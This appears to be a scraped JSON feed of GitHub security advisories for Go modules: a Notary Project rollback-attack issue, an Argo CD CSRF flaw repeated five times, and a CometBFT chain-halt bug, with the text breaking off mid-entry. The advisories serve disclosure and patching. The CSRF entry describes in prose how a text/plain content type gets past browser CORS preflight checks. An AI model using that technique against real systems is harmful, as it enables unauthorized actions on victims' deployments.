{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Go modules",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/go.json",
    "description": "Security Advisory for Go modules on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An external actor with control of a compromised container registry can provide outdated versions of OCI artifacts, such as Images. This could lead artifact consumers with relaxed trust policies (such as <code>permissive</code> instead of <code>strict</code>) to potentially use artifacts with signatures that are no longer valid, making them susceptible to any exploits those artifacts may contain.</p>\n<h3 id=\"mitigation\">Mitigation</h3>\n<p>In Notary Project, an artifact publisher can control the validity period of artifact by specifying signature expiry during the signing process. Using shorter signature validity periods along with processes to periodically resign artifacts, allows artifact producers to ensure that their consumers will only receive up-to-date artifacts. Artifact consumers should correspondingly use a <code>strict</code> or equivalent trust policy that enforces signature expiry. Together these steps enable use of up-to-date artifacts and safeguard against rollback attack in the event of registry compromise. The Notary Project offers various signature validation options such as <code>permissive</code>, <code>audit</code> and <code>skip</code> to support various scenarios. These scenarios includes 1) situations demanding urgent workload deployment, necessitating the bypassing of expired or revoked signatures; 2) auditing of artifacts lacking signatures without interrupting workload; and 3) skipping of verification for specific images that might have undergone validation through alternative mechanisms.</p>\n<p>Additionally, the Notary Project supports revocation to ensure the signature freshness. Artifact publishers can sign with short-lived certificates and revoke older certificates when necessary. This revocation serves as a signal to inform artifact consumers that the corresponding unexpired artifact is no longer approved by the publisher. This enables the artifact publisher to control the validity of the signature independently of their ability to manage artifacts in a compromised registry.</p>\n<h3 id=\"credit\">Credit</h3>\n<p>The Notary Project extends its gratitude to Justin Cappos (@JustinCappos) for responsibly disclosing the issue.</p>\n<p>_<strong>Note:</strong> we have updated <a href=\"https://github.com/notaryproject/specifications/blob/main/threatmodels/notation-threatmodel.md\">threat model</a> to include considerations for rollback attack.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/notaryproject/specifications/security/advisories/GHSA-57wx-m636-g3g8\">https://github.com/notaryproject/specifications/security/advisories/GHSA-57wx-m636-g3g8</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23332\">https://nvd.nist.gov/vuln/detail/CVE-2024-23332</a></li>\n<li><a href=\"https://github.com/notaryproject/specifications/commit/cdabdd1042de2999c685fa5d422a785ded9c983a\">https://github.com/notaryproject/specifications/commit/cdabdd1042de2999c685fa5d422a785ded9c983a</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-57wx-m636-g3g8\">https://github.com/advisories/GHSA-57wx-m636-g3g8</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-57wx-m636-g3g8",
            "title": "[github.com/notaryproject/notation] Go package github.com/notaryproject/notation configured with permissive trust policies potentially susceptible to rollback attack from compromised registry",
            "date_modified": "2024-01-22T20:57:50.000Z",
            "date_published": "2024-01-19T22:12:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-57wx-m636-g3g8"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Argo CD API prior to versions 2.10-rc2, 2.9.4, 2.8.8, and 2.7.16 are vulnerable to a cross-server request forgery (CSRF) attack when the attacker has the ability to write HTML to a page on the same parent domain as Argo CD.</p>\n<p>A CSRF attack works by tricking an authenticated Argo CD user into loading a web page which contains code to call Argo CD API endpoints on the victim‚Äôs behalf. For example, an attacker could send an Argo CD user a link to a page which looks harmless but in the background calls an Argo CD API endpoint to create an application running malicious code.</p>\n<p>Argo CD uses the ‚ÄúLax‚Äù SameSite cookie policy to prevent CSRF attacks where the attacker controls an external domain. The malicious external website can attempt to call the Argo CD API, but the web browser will refuse to send the Argo CD auth token with the request.</p>\n<p>Many companies host Argo CD on an internal subdomain, such as <a href=\"https://argo-cd.example.com/\">https://argo-cd.internal.example.com</a>. If an attacker can place malicious code on, for example, <a href=\"https://test.internal.example.com/\">https://test.internal.example.com/</a>, they can still perform a CSRF attack. In this case, the ‚ÄúLax‚Äù SameSite cookie does not prevent the browser from sending the auth cookie, because the destination is a parent domain of the Argo CD API.</p>\n<p>Browsers generally block such attacks by applying CORS policies to sensitive requests with sensitive content types. Specifically, browsers will send a ‚Äúpreflight request‚Äù for POSTs with content type ‚Äúapplication/json‚Äù asking the destination API ‚Äúare you allowed to accept requests from my domain?‚Äù If the destination API does not answer ‚Äúyes,‚Äù the browser will block the request.</p>\n<p>Before the patched versions, Argo CD did not validate that requests contained the correct content type header. So an attacker could bypass the browser‚Äôs CORS check by setting the content type to something which is considered ‚Äúnot sensitive‚Äù such as ‚Äútext/plain.‚Äù The browser wouldn‚Äôt send the preflight request, and Argo CD would happily accept the contents (which are actually still JSON) and perform the requested action (such as running malicious code).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<ul>\n<li>2.10-rc2</li>\n<li>2.9.4</li>\n<li>2.8.8</li>\n<li>2.7.16</li>\n</ul>\n<p>üö® <strong>The patch contains a breaking API change.</strong> üö® The Argo CD API will no longer accept non-GET requests which do not specify application/json as their Content-Type. The accepted content types list is configurable, and it is possible (but discouraged) to disable the content type check completely.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The only way to completely resolve the issue is to upgrade.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>The Argo CD team would like to express their gratitude to An Trinh of <a href=\"https://calif.io/\">Calif</a> who reported the issue confidentially according to our <a href=\"https://github.com/argoproj/argo-cd/blob/master/SECURITY.md#reporting-a-vulnerability\">guidelines</a> and published a helpful <a href=\"https://blog.calif.io/p/argo-cd-csrf\">blog post</a> to describe the issue. We would also like to thank them for actively participating in the review for the patch.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>The problem was originally reported in a <a href=\"https://github.com/argoproj/argo-cd/issues/2496\">GitHub issue</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-92mw-q256-5vwg\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-92mw-q256-5vwg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-22424\">https://nvd.nist.gov/vuln/detail/CVE-2024-22424</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/issues/2496\">https://github.com/argoproj/argo-cd/issues/2496</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/pull/16860\">https://github.com/argoproj/argo-cd/pull/16860</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/0b459f224b3186707809be8240dfc3a6028f42a0\">https://github.com/argoproj/argo-cd/commit/0b459f224b3186707809be8240dfc3a6028f42a0</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/13fe3ca589f6f2ded6001ce114e354602ed058b3\">https://github.com/argoproj/argo-cd/commit/13fe3ca589f6f2ded6001ce114e354602ed058b3</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/3c5878ecf41581942281e9c95745f073bdfbf9c3\">https://github.com/argoproj/argo-cd/commit/3c5878ecf41581942281e9c95745f073bdfbf9c3</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/f569aa105e0fe5940bc736c68e2fc90ee4a6ed94\">https://github.com/argoproj/argo-cd/commit/f569aa105e0fe5940bc736c68e2fc90ee4a6ed94</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-92mw-q256-5vwg\">https://github.com/advisories/GHSA-92mw-q256-5vwg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-92mw-q256-5vwg",
            "title": "[github.com/argoproj/argo-cd/v2] github.com/argoproj/argo-cd Cross-Site Request Forgery vulnerability",
            "date_modified": "2024-01-19T20:37:53.000Z",
            "date_published": "2024-01-19T20:37:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-92mw-q256-5vwg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Argo CD API prior to versions 2.10-rc2, 2.9.4, 2.8.8, and 2.7.16 are vulnerable to a cross-server request forgery (CSRF) attack when the attacker has the ability to write HTML to a page on the same parent domain as Argo CD.</p>\n<p>A CSRF attack works by tricking an authenticated Argo CD user into loading a web page which contains code to call Argo CD API endpoints on the victim‚Äôs behalf. For example, an attacker could send an Argo CD user a link to a page which looks harmless but in the background calls an Argo CD API endpoint to create an application running malicious code.</p>\n<p>Argo CD uses the ‚ÄúLax‚Äù SameSite cookie policy to prevent CSRF attacks where the attacker controls an external domain. The malicious external website can attempt to call the Argo CD API, but the web browser will refuse to send the Argo CD auth token with the request.</p>\n<p>Many companies host Argo CD on an internal subdomain, such as <a href=\"https://argo-cd.example.com/\">https://argo-cd.internal.example.com</a>. If an attacker can place malicious code on, for example, <a href=\"https://test.internal.example.com/\">https://test.internal.example.com/</a>, they can still perform a CSRF attack. In this case, the ‚ÄúLax‚Äù SameSite cookie does not prevent the browser from sending the auth cookie, because the destination is a parent domain of the Argo CD API.</p>\n<p>Browsers generally block such attacks by applying CORS policies to sensitive requests with sensitive content types. Specifically, browsers will send a ‚Äúpreflight request‚Äù for POSTs with content type ‚Äúapplication/json‚Äù asking the destination API ‚Äúare you allowed to accept requests from my domain?‚Äù If the destination API does not answer ‚Äúyes,‚Äù the browser will block the request.</p>\n<p>Before the patched versions, Argo CD did not validate that requests contained the correct content type header. So an attacker could bypass the browser‚Äôs CORS check by setting the content type to something which is considered ‚Äúnot sensitive‚Äù such as ‚Äútext/plain.‚Äù The browser wouldn‚Äôt send the preflight request, and Argo CD would happily accept the contents (which are actually still JSON) and perform the requested action (such as running malicious code).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<ul>\n<li>2.10-rc2</li>\n<li>2.9.4</li>\n<li>2.8.8</li>\n<li>2.7.16</li>\n</ul>\n<p>üö® <strong>The patch contains a breaking API change.</strong> üö® The Argo CD API will no longer accept non-GET requests which do not specify application/json as their Content-Type. The accepted content types list is configurable, and it is possible (but discouraged) to disable the content type check completely.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The only way to completely resolve the issue is to upgrade.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>The Argo CD team would like to express their gratitude to An Trinh of <a href=\"https://calif.io/\">Calif</a> who reported the issue confidentially according to our <a href=\"https://github.com/argoproj/argo-cd/blob/master/SECURITY.md#reporting-a-vulnerability\">guidelines</a> and published a helpful <a href=\"https://blog.calif.io/p/argo-cd-csrf\">blog post</a> to describe the issue. We would also like to thank them for actively participating in the review for the patch.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>The problem was originally reported in a <a href=\"https://github.com/argoproj/argo-cd/issues/2496\">GitHub issue</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-92mw-q256-5vwg\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-92mw-q256-5vwg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-22424\">https://nvd.nist.gov/vuln/detail/CVE-2024-22424</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/issues/2496\">https://github.com/argoproj/argo-cd/issues/2496</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/pull/16860\">https://github.com/argoproj/argo-cd/pull/16860</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/0b459f224b3186707809be8240dfc3a6028f42a0\">https://github.com/argoproj/argo-cd/commit/0b459f224b3186707809be8240dfc3a6028f42a0</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/13fe3ca589f6f2ded6001ce114e354602ed058b3\">https://github.com/argoproj/argo-cd/commit/13fe3ca589f6f2ded6001ce114e354602ed058b3</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/3c5878ecf41581942281e9c95745f073bdfbf9c3\">https://github.com/argoproj/argo-cd/commit/3c5878ecf41581942281e9c95745f073bdfbf9c3</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/f569aa105e0fe5940bc736c68e2fc90ee4a6ed94\">https://github.com/argoproj/argo-cd/commit/f569aa105e0fe5940bc736c68e2fc90ee4a6ed94</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-92mw-q256-5vwg\">https://github.com/advisories/GHSA-92mw-q256-5vwg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-92mw-q256-5vwg",
            "title": "[github.com/argoproj/argo-cd/v2] github.com/argoproj/argo-cd Cross-Site Request Forgery vulnerability",
            "date_modified": "2024-01-19T20:37:53.000Z",
            "date_published": "2024-01-19T20:37:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-92mw-q256-5vwg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Argo CD API prior to versions 2.10-rc2, 2.9.4, 2.8.8, and 2.7.16 are vulnerable to a cross-server request forgery (CSRF) attack when the attacker has the ability to write HTML to a page on the same parent domain as Argo CD.</p>\n<p>A CSRF attack works by tricking an authenticated Argo CD user into loading a web page which contains code to call Argo CD API endpoints on the victim‚Äôs behalf. For example, an attacker could send an Argo CD user a link to a page which looks harmless but in the background calls an Argo CD API endpoint to create an application running malicious code.</p>\n<p>Argo CD uses the ‚ÄúLax‚Äù SameSite cookie policy to prevent CSRF attacks where the attacker controls an external domain. The malicious external website can attempt to call the Argo CD API, but the web browser will refuse to send the Argo CD auth token with the request.</p>\n<p>Many companies host Argo CD on an internal subdomain, such as <a href=\"https://argo-cd.example.com/\">https://argo-cd.internal.example.com</a>. If an attacker can place malicious code on, for example, <a href=\"https://test.internal.example.com/\">https://test.internal.example.com/</a>, they can still perform a CSRF attack. In this case, the ‚ÄúLax‚Äù SameSite cookie does not prevent the browser from sending the auth cookie, because the destination is a parent domain of the Argo CD API.</p>\n<p>Browsers generally block such attacks by applying CORS policies to sensitive requests with sensitive content types. Specifically, browsers will send a ‚Äúpreflight request‚Äù for POSTs with content type ‚Äúapplication/json‚Äù asking the destination API ‚Äúare you allowed to accept requests from my domain?‚Äù If the destination API does not answer ‚Äúyes,‚Äù the browser will block the request.</p>\n<p>Before the patched versions, Argo CD did not validate that requests contained the correct content type header. So an attacker could bypass the browser‚Äôs CORS check by setting the content type to something which is considered ‚Äúnot sensitive‚Äù such as ‚Äútext/plain.‚Äù The browser wouldn‚Äôt send the preflight request, and Argo CD would happily accept the contents (which are actually still JSON) and perform the requested action (such as running malicious code).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<ul>\n<li>2.10-rc2</li>\n<li>2.9.4</li>\n<li>2.8.8</li>\n<li>2.7.16</li>\n</ul>\n<p>üö® <strong>The patch contains a breaking API change.</strong> üö® The Argo CD API will no longer accept non-GET requests which do not specify application/json as their Content-Type. The accepted content types list is configurable, and it is possible (but discouraged) to disable the content type check completely.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The only way to completely resolve the issue is to upgrade.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>The Argo CD team would like to express their gratitude to An Trinh of <a href=\"https://calif.io/\">Calif</a> who reported the issue confidentially according to our <a href=\"https://github.com/argoproj/argo-cd/blob/master/SECURITY.md#reporting-a-vulnerability\">guidelines</a> and published a helpful <a href=\"https://blog.calif.io/p/argo-cd-csrf\">blog post</a> to describe the issue. We would also like to thank them for actively participating in the review for the patch.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>The problem was originally reported in a <a href=\"https://github.com/argoproj/argo-cd/issues/2496\">GitHub issue</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-92mw-q256-5vwg\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-92mw-q256-5vwg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-22424\">https://nvd.nist.gov/vuln/detail/CVE-2024-22424</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/issues/2496\">https://github.com/argoproj/argo-cd/issues/2496</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/pull/16860\">https://github.com/argoproj/argo-cd/pull/16860</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/0b459f224b3186707809be8240dfc3a6028f42a0\">https://github.com/argoproj/argo-cd/commit/0b459f224b3186707809be8240dfc3a6028f42a0</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/13fe3ca589f6f2ded6001ce114e354602ed058b3\">https://github.com/argoproj/argo-cd/commit/13fe3ca589f6f2ded6001ce114e354602ed058b3</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/3c5878ecf41581942281e9c95745f073bdfbf9c3\">https://github.com/argoproj/argo-cd/commit/3c5878ecf41581942281e9c95745f073bdfbf9c3</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/f569aa105e0fe5940bc736c68e2fc90ee4a6ed94\">https://github.com/argoproj/argo-cd/commit/f569aa105e0fe5940bc736c68e2fc90ee4a6ed94</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-92mw-q256-5vwg\">https://github.com/advisories/GHSA-92mw-q256-5vwg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-92mw-q256-5vwg",
            "title": "[github.com/argoproj/argo-cd/v2] github.com/argoproj/argo-cd Cross-Site Request Forgery vulnerability",
            "date_modified": "2024-01-19T20:37:53.000Z",
            "date_published": "2024-01-19T20:37:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-92mw-q256-5vwg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Argo CD API prior to versions 2.10-rc2, 2.9.4, 2.8.8, and 2.7.16 are vulnerable to a cross-server request forgery (CSRF) attack when the attacker has the ability to write HTML to a page on the same parent domain as Argo CD.</p>\n<p>A CSRF attack works by tricking an authenticated Argo CD user into loading a web page which contains code to call Argo CD API endpoints on the victim‚Äôs behalf. For example, an attacker could send an Argo CD user a link to a page which looks harmless but in the background calls an Argo CD API endpoint to create an application running malicious code.</p>\n<p>Argo CD uses the ‚ÄúLax‚Äù SameSite cookie policy to prevent CSRF attacks where the attacker controls an external domain. The malicious external website can attempt to call the Argo CD API, but the web browser will refuse to send the Argo CD auth token with the request.</p>\n<p>Many companies host Argo CD on an internal subdomain, such as <a href=\"https://argo-cd.example.com/\">https://argo-cd.internal.example.com</a>. If an attacker can place malicious code on, for example, <a href=\"https://test.internal.example.com/\">https://test.internal.example.com/</a>, they can still perform a CSRF attack. In this case, the ‚ÄúLax‚Äù SameSite cookie does not prevent the browser from sending the auth cookie, because the destination is a parent domain of the Argo CD API.</p>\n<p>Browsers generally block such attacks by applying CORS policies to sensitive requests with sensitive content types. Specifically, browsers will send a ‚Äúpreflight request‚Äù for POSTs with content type ‚Äúapplication/json‚Äù asking the destination API ‚Äúare you allowed to accept requests from my domain?‚Äù If the destination API does not answer ‚Äúyes,‚Äù the browser will block the request.</p>\n<p>Before the patched versions, Argo CD did not validate that requests contained the correct content type header. So an attacker could bypass the browser‚Äôs CORS check by setting the content type to something which is considered ‚Äúnot sensitive‚Äù such as ‚Äútext/plain.‚Äù The browser wouldn‚Äôt send the preflight request, and Argo CD would happily accept the contents (which are actually still JSON) and perform the requested action (such as running malicious code).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<ul>\n<li>2.10-rc2</li>\n<li>2.9.4</li>\n<li>2.8.8</li>\n<li>2.7.16</li>\n</ul>\n<p>üö® <strong>The patch contains a breaking API change.</strong> üö® The Argo CD API will no longer accept non-GET requests which do not specify application/json as their Content-Type. The accepted content types list is configurable, and it is possible (but discouraged) to disable the content type check completely.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The only way to completely resolve the issue is to upgrade.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>The Argo CD team would like to express their gratitude to An Trinh of <a href=\"https://calif.io/\">Calif</a> who reported the issue confidentially according to our <a href=\"https://github.com/argoproj/argo-cd/blob/master/SECURITY.md#reporting-a-vulnerability\">guidelines</a> and published a helpful <a href=\"https://blog.calif.io/p/argo-cd-csrf\">blog post</a> to describe the issue. We would also like to thank them for actively participating in the review for the patch.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>The problem was originally reported in a <a href=\"https://github.com/argoproj/argo-cd/issues/2496\">GitHub issue</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-92mw-q256-5vwg\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-92mw-q256-5vwg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-22424\">https://nvd.nist.gov/vuln/detail/CVE-2024-22424</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/issues/2496\">https://github.com/argoproj/argo-cd/issues/2496</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/pull/16860\">https://github.com/argoproj/argo-cd/pull/16860</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/0b459f224b3186707809be8240dfc3a6028f42a0\">https://github.com/argoproj/argo-cd/commit/0b459f224b3186707809be8240dfc3a6028f42a0</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/13fe3ca589f6f2ded6001ce114e354602ed058b3\">https://github.com/argoproj/argo-cd/commit/13fe3ca589f6f2ded6001ce114e354602ed058b3</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/3c5878ecf41581942281e9c95745f073bdfbf9c3\">https://github.com/argoproj/argo-cd/commit/3c5878ecf41581942281e9c95745f073bdfbf9c3</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/f569aa105e0fe5940bc736c68e2fc90ee4a6ed94\">https://github.com/argoproj/argo-cd/commit/f569aa105e0fe5940bc736c68e2fc90ee4a6ed94</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-92mw-q256-5vwg\">https://github.com/advisories/GHSA-92mw-q256-5vwg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-92mw-q256-5vwg",
            "title": "[github.com/argoproj/argo-cd/v2] github.com/argoproj/argo-cd Cross-Site Request Forgery vulnerability",
            "date_modified": "2024-01-19T20:37:53.000Z",
            "date_published": "2024-01-19T20:37:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-92mw-q256-5vwg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The Argo CD API prior to versions 2.10-rc2, 2.9.4, 2.8.8, and 2.7.16 are vulnerable to a cross-server request forgery (CSRF) attack when the attacker has the ability to write HTML to a page on the same parent domain as Argo CD.</p>\n<p>A CSRF attack works by tricking an authenticated Argo CD user into loading a web page which contains code to call Argo CD API endpoints on the victim‚Äôs behalf. For example, an attacker could send an Argo CD user a link to a page which looks harmless but in the background calls an Argo CD API endpoint to create an application running malicious code.</p>\n<p>Argo CD uses the ‚ÄúLax‚Äù SameSite cookie policy to prevent CSRF attacks where the attacker controls an external domain. The malicious external website can attempt to call the Argo CD API, but the web browser will refuse to send the Argo CD auth token with the request.</p>\n<p>Many companies host Argo CD on an internal subdomain, such as <a href=\"https://argo-cd.example.com/\">https://argo-cd.internal.example.com</a>. If an attacker can place malicious code on, for example, <a href=\"https://test.internal.example.com/\">https://test.internal.example.com/</a>, they can still perform a CSRF attack. In this case, the ‚ÄúLax‚Äù SameSite cookie does not prevent the browser from sending the auth cookie, because the destination is a parent domain of the Argo CD API.</p>\n<p>Browsers generally block such attacks by applying CORS policies to sensitive requests with sensitive content types. Specifically, browsers will send a ‚Äúpreflight request‚Äù for POSTs with content type ‚Äúapplication/json‚Äù asking the destination API ‚Äúare you allowed to accept requests from my domain?‚Äù If the destination API does not answer ‚Äúyes,‚Äù the browser will block the request.</p>\n<p>Before the patched versions, Argo CD did not validate that requests contained the correct content type header. So an attacker could bypass the browser‚Äôs CORS check by setting the content type to something which is considered ‚Äúnot sensitive‚Äù such as ‚Äútext/plain.‚Äù The browser wouldn‚Äôt send the preflight request, and Argo CD would happily accept the contents (which are actually still JSON) and perform the requested action (such as running malicious code).</p>\n<h3 id=\"patches\">Patches</h3>\n<p>A patch for this vulnerability has been released in the following Argo CD versions:</p>\n<ul>\n<li>2.10-rc2</li>\n<li>2.9.4</li>\n<li>2.8.8</li>\n<li>2.7.16</li>\n</ul>\n<p>üö® <strong>The patch contains a breaking API change.</strong> üö® The Argo CD API will no longer accept non-GET requests which do not specify application/json as their Content-Type. The accepted content types list is configurable, and it is possible (but discouraged) to disable the content type check completely.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>The only way to completely resolve the issue is to upgrade.</p>\n<h3 id=\"credits\">Credits</h3>\n<p>The Argo CD team would like to express their gratitude to An Trinh of <a href=\"https://calif.io/\">Calif</a> who reported the issue confidentially according to our <a href=\"https://github.com/argoproj/argo-cd/blob/master/SECURITY.md#reporting-a-vulnerability\">guidelines</a> and published a helpful <a href=\"https://blog.calif.io/p/argo-cd-csrf\">blog post</a> to describe the issue. We would also like to thank them for actively participating in the review for the patch.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>The problem was originally reported in a <a href=\"https://github.com/argoproj/argo-cd/issues/2496\">GitHub issue</a></li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/argoproj/argo-cd/security/advisories/GHSA-92mw-q256-5vwg\">https://github.com/argoproj/argo-cd/security/advisories/GHSA-92mw-q256-5vwg</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-22424\">https://nvd.nist.gov/vuln/detail/CVE-2024-22424</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/issues/2496\">https://github.com/argoproj/argo-cd/issues/2496</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/pull/16860\">https://github.com/argoproj/argo-cd/pull/16860</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/0b459f224b3186707809be8240dfc3a6028f42a0\">https://github.com/argoproj/argo-cd/commit/0b459f224b3186707809be8240dfc3a6028f42a0</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/13fe3ca589f6f2ded6001ce114e354602ed058b3\">https://github.com/argoproj/argo-cd/commit/13fe3ca589f6f2ded6001ce114e354602ed058b3</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/3c5878ecf41581942281e9c95745f073bdfbf9c3\">https://github.com/argoproj/argo-cd/commit/3c5878ecf41581942281e9c95745f073bdfbf9c3</a></li>\n<li><a href=\"https://github.com/argoproj/argo-cd/commit/f569aa105e0fe5940bc736c68e2fc90ee4a6ed94\">https://github.com/argoproj/argo-cd/commit/f569aa105e0fe5940bc736c68e2fc90ee4a6ed94</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-92mw-q256-5vwg\">https://github.com/advisories/GHSA-92mw-q256-5vwg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-92mw-q256-5vwg",
            "title": "[github.com/argoproj/argo-cd] github.com/argoproj/argo-cd Cross-Site Request Forgery vulnerability",
            "date_modified": "2024-01-19T20:37:53.000Z",
            "date_published": "2024-01-19T20:37:53.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-92mw-q256-5vwg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h2 id=\"summary\">Summary</h2>\n<p>A vulnerability in CometBFT‚Äôs validation logic for <code>VoteExtensionsEnableHeight</code> can result in a chain halt when triggered through a governance parameter change proposal on an ABCI2 Application Chain. If a parameter change proposal including a <code>VoteExtensionsEnableHeight</code> modification is passed, nodes running the affected versions may panic, halting the network.</p>\n<p>The CometBFT team addressed this issue by improving validation logic for the <code>VoteExtensionsEnableHeight</code> to correctly handle governance proposals addressing this parameter.</p>\n<h2 id=\"next-steps-for-impacted-parties\">Next Steps for Impacted Parties</h2>\n<p>If you are a chain developer with an active network running on CometBFT v. 0.38.x, we recommend updating your chain application to v0.38.3 or later of CometBFT to patch this issue. </p>\n<p>This issue can be resolved with a ‚Äúsoft patch‚Äù to an active network, i.e. nodes can be patched and restarted at different times without the need for a coordinated upgrade that halts a chain. If this patching methodology is used, the risk of a network halt triggered by this issue is mitigated once more than 66.7% of voting power on the network has applied the update, which provides protection from exploitation while on-chain governance processes for software upgrades take place. Once all validator nodes operating a network have been updated, the risk of a network halt due to this issue will be fully resolved. </p>\n<p>For more information about CometBFT, see <a href=\"https://docs.cometbft.com/\">https://docs.cometbft.com/</a>. </p>\n<p>This issue was found by Dongsam (<a href=\"https://twitter.com/b__harvest?lang=en\">@b_harvest</a>) who reported it to the Cosmos Bug Bounty Program on HackerOne on January 15, 2024. If you believe you have found a bug in the Interchain Stack or would like to contribute to the program by reporting a bug, please see <a href=\"https://hackerone.com/cosmos\">https://hackerone.com/cosmos</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/cometbft/cometbft/security/advisories/GHSA-qr8r-m495-7hc4\">https://github.com/cometbft/cometbft/security/advisories/GHSA-qr8r-m495-7hc4</a></li>\n<li><a 